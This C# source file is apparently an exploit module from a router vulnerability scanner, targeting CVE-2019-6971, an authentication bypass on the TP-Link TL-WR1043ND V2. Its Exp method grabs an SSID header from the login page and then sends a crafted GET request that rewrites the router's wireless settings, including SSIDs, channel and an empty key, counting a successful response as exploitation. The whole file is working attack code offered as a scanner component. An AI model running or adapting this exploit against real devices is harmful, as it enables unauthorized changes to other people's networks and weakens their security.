namespace RouterScanner.Services.VulHub;

/// <summary>
/// TP-Link TL-WR1043ND 2 - 身份验证绕过
/// <br/><see cref="https://www.exploit-db.com/exploits/47483"/>
/// </summary>
public sealed class CVE_2019_6971 : RouterVulHubBase<CVE_2019_6971>, IRouterVulHub
{
    public string CVE => "CVE-2019-6971";
    public string VulType => "身份验证绕过";
    public string Production => "TP-Link";
    public List<string> Version => ["TL-WR1043ND V2"];

    public CVE_2019_6971()
    {
    }


    private string SSID { get; set; } = string.Empty;

    public override async ValueTask<VulResult> Exp(CancellationToken cancellationToken = default)
    {
        var resp = await Request("/userRpm/LoginRpm.htm?Save=Save", cancellationToken).ConfigureAwait(false);

        if (!resp.Headers.TryGetValues("SSID", out IEnumerable<string>? values))
        {
            return OK(false);
        }
        SSID = values.FirstOrDefault() ?? string.Empty;

        var uri = $"/userRpm/WlanNetworkRpm.htm?ssid1={SSID}&ssid2=TP-LINK_660A_2&ssid3=TP-LINK_660A_3&ssid4=TP-LINK_660A_4&region=43&band=0&mode=5&chanWidth=2&channel=1&rate=83&speedboost=2&broadcast=2&brlssid=&brlbssid=&addrType=1&keytype=1&wepindex=1&authtype=1&keytext=&Save=Save";
        resp = await Request(uri, cancellationToken).ConfigureAwait(false);
        if (!resp.IsSuccessStatusCode)
        {
            return OK(false);
        }
        return OK();
    }


    private Task<HttpResponseMessage> Request(string uri, CancellationToken cancellationToken = default)
    {
        var rawText = $"""
            GET {uri} HTTP/1.1
            Host: {Host}
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
            Accept-Language: en-US,en;q=0.5
            Accept-Encoding: gzip, deflate
            Referer: http://{Host}/userRpm/LoginRpm.htm?Save=Save
            Connection: close
            Cookie: Authorization={GetBasicAuth()}
            Upgrade-Insecure-Requests: 1
            """;

        return Http.SendAsync(rawText, SSL, cancellationToken);
    }
}
